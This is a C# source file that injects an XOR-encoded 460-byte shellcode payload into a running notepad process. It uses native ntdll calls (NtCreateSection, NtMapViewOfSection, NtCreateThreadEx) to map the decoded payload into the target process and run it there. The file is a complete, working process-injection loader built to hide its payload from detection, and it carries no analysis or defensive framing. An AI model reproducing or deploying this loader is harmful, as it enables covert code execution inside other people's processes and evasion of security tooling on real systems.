using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NtAPIXOR
{
    class Program
    {
        [DllImport("ntdll.dll")]
        public static extern uint NtCreateSection(
            ref IntPtr SectionHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            ref ulong MaximumSize,
            uint SectionPageProtection,
            uint AllocationAttributes,
            IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            out IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            IntPtr SectionOffset,
            out ulong ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtCreateThreadEx(
            out IntPtr threadHandle,
            UInt32 desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool inCreateSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        public static void XorByInputKeyEnc(byte[] shellcode, int shellcodeSize, byte[] key, int keySize)
        {
            for (int i = 0, j = 0; i < shellcodeSize; i++, j++)
            {
                if (j >= keySize)
                {
                    j = 0;
                }
                shellcode[i] ^= key[j];
            }
        }

        static void Main(string[] args)
        {
            //if there are more processes like this, take first found
            var target = Process.GetProcessesByName("notepad")[0];

            //xor encoded
            byte[] shellcode = new byte[460] { 0xCD, 0x7F, 0xB3, 0xD5, 0xC2, 0xDF, 0xF1, 0x30, 0x30, 0x30, 0x71, 0x61, 0x1B, 0x60, 0x31, 0x60, 0x67, 0x7F, 0x01, 0xE3, 0x57, 0x7F, 0xBA, 0x62, 0x50, 0x78, 0xBB, 0x62, 0x42, 0x78, 0xE8, 0x63, 0x11, 0x7F, 0xBB, 0x43, 0x62, 0x7F, 0x3E, 0x87, 0x7A, 0x7A, 0x7D, 0x01, 0x93, 0x78, 0x52, 0xF1, 0x9D, 0x0B, 0x51, 0x4D, 0x30, 0x1B, 0x11, 0x71, 0xF1, 0xF9, 0x3D, 0x71, 0x5B, 0xF1, 0x81, 0xDC, 0x63, 0x76, 0x61, 0x79, 0xB9, 0x65, 0x11, 0xBB, 0x72, 0x0C, 0x78, 0x31, 0x8A, 0xBB, 0xE3, 0xB9, 0x31, 0x37, 0x30, 0x79, 0xB7, 0xF7, 0x45, 0x57, 0x78, 0x31, 0xE0, 0x60, 0xD1, 0x78, 0x7B, 0x75, 0xBA, 0x77, 0x10, 0x78, 0x33, 0xE7, 0xD2, 0x66, 0x78, 0xCF, 0xF9, 0x71, 0xD1, 0x04, 0xEB, 0x79, 0x30, 0xE1, 0x7D, 0x00, 0xFB, 0x7F, 0x00, 0xF0, 0x9C, 0x71, 0xF1, 0xF9, 0x57, 0x71, 0x62, 0xF0, 0x09, 0xD7, 0x45, 0xC0, 0x7E, 0x34, 0x7D, 0x14, 0x38, 0x75, 0x09, 0xE1, 0x2F, 0xE8, 0x3B, 0x75, 0xBA, 0x77, 0x14, 0x78, 0x33, 0xE7, 0x57, 0x71, 0xBB, 0x3C, 0x78, 0x74, 0xD1, 0x70, 0x7F, 0x78, 0x30, 0xE7, 0x71, 0xBA, 0x36, 0xBF, 0x79, 0x31, 0xE0, 0x71, 0x68, 0x71, 0x02, 0x6E, 0x3A, 0x6B, 0x70, 0x6F, 0x71, 0x68, 0x73, 0x6D, 0x79, 0xB3, 0xDC, 0x10, 0x71, 0x62, 0xA5, 0xD0, 0x3B, 0x70, 0x68, 0x6D, 0x78, 0xBA, 0x20, 0xDE, 0x66, 0xCF, 0xCF, 0xCF, 0x6D, 0x79, 0xE4, 0x47, 0x10, 0x03, 0x6E, 0x04, 0x02, 0x31, 0x32, 0x76, 0x67, 0x79, 0xB9, 0xD6, 0x78, 0xB1, 0xB6, 0x90, 0x62, 0x31, 0x31, 0x7E, 0xB9, 0xD4, 0x7B, 0x8B, 0x33, 0x30, 0x31, 0x8B, 0xF0, 0x98, 0x5A, 0x4A, 0x22, 0x65, 0x78, 0xBE, 0xD4, 0x7D, 0xBB, 0xC6, 0x70, 0x8A, 0x7C, 0x47, 0x16, 0x37, 0xA5, 0xE5, 0x2F, 0xB8, 0xDB, 0x5F, 0x31, 0x30, 0x32, 0x37, 0x68, 0x71, 0x8A, 0x19, 0xB0, 0x5B, 0x5A, 0xCF, 0xB6, 0x61, 0x61, 0x7A, 0x01, 0xF8, 0x7F, 0x06, 0xF1, 0x78, 0xCF, 0xF0, 0x78, 0xB9, 0x98, 0x78, 0x9C, 0xF1, 0x79, 0xBE, 0xF1, 0x70, 0x88, 0xDD, 0x3E, 0xEF, 0xD0, 0xCF, 0xE5, 0x78, 0xD3, 0xF7, 0x09, 0x21, 0x70, 0x6F, 0x7C, 0xB8, 0xD0, 0x7F, 0xB8, 0xC9, 0x71, 0x8A, 0xA9, 0x95, 0x2E, 0x51, 0x9C, 0xE4, 0x79, 0xB6, 0xF4, 0x71, 0x30, 0x37, 0x31, 0x79, 0x88, 0x53, 0x5D, 0x54, 0x5A, 0x30, 0x63, 0x31, 0x31, 0x76, 0x60, 0x70, 0x62, 0x7F, 0xB8, 0xD2, 0x67, 0x67, 0x67, 0x7D, 0x6B, 0xF0, 0x09, 0x3C, 0x68, 0x76, 0x60, 0xD3, 0xCE, 0x51, 0xF6, 0x74, 0x14, 0x64, 0x31, 0x31, 0x12, 0xBD, 0x27, 0x15, 0x29, 0xF1, 0x30, 0x59, 0x7A, 0xBE, 0xD7, 0x66, 0x60, 0x71, 0x60, 0x71, 0x0A, 0x71, 0x33, 0x78, 0xCE, 0xF7, 0x71, 0x61, 0x7B, 0xC8, 0xF9, 0x7D, 0xB9, 0xF1, 0x7C, 0xB9, 0x9B, 0x71, 0xD9, 0x48, 0xFD, 0x08, 0xB6, 0xCE, 0xE7, 0x7F, 0x00, 0xE2, 0x78, 0xCF, 0xFA, 0xBB, 0x54, 0x71, 0xD9, 0x39, 0xB6, 0x2A, 0x50, 0xCE, 0xE7, 0x8C, 0xC1, 0x85, 0x92, 0x66, 0x71, 0x8A, 0xFC, 0xA5, 0xDE, 0xAC, 0xCE, 0xE2, 0x78, 0xB2, 0xF6, 0x1F, 0x0D, 0x36, 0x4C, 0x3A, 0xB0, 0xCB, 0xBA, 0x45, 0x66, 0x8A, 0x76, 0x24, 0x42, 0x5E, 0x58, 0x37, 0x68, 0x71, 0xB9, 0xEA, 0xCF, 0xE5 };
            byte[] key = new byte[16] { 0x31, 0x37, 0x30, 0x31, 0x32, 0x37, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5a, 0x30, 0x63, 0x31 };

            //decode the payload
            XorByInputKeyEnc(shellcode, shellcode.Length, key, key.Length);

            //assign zero to handle
            var hSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            //create a new section in current process
            NtCreateSection(
                ref hSection,
                0x10000000,     // SECTION_ALL_ACCESS
                IntPtr.Zero,
                ref maxSize,
                0x40,           // PAGE_EXECUTE_READWRITE
                0x08000000,     // SEC_COMMIT
                IntPtr.Zero);

            //map that section into memory of current process as RW
            NtMapViewOfSection(
                hSection,
                (IntPtr)(-1),   // will target the current process
                out var localBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out var _,
                2,              // ViewUnmap (created view will not be inherited by child processes)
                0,
                0x04);          // PAGE_READWRITE

            //copy the shellcode into own process
            Marshal.Copy(shellcode, 0, localBaseAddress, shellcode.Length);

            NtMapViewOfSection(
                hSection,
                target.Handle,
                out var remoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out _,
                2,
                0,
                0x20);      // PAGE_EXECUTE_READ

            //shellcode is in target process, execute it
            NtCreateThreadEx(
                out _,
                0x001F0000, // STANDARD_RIGHTS_ALL
                IntPtr.Zero,
                target.Handle,
                remoteBaseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

        }
    }
}
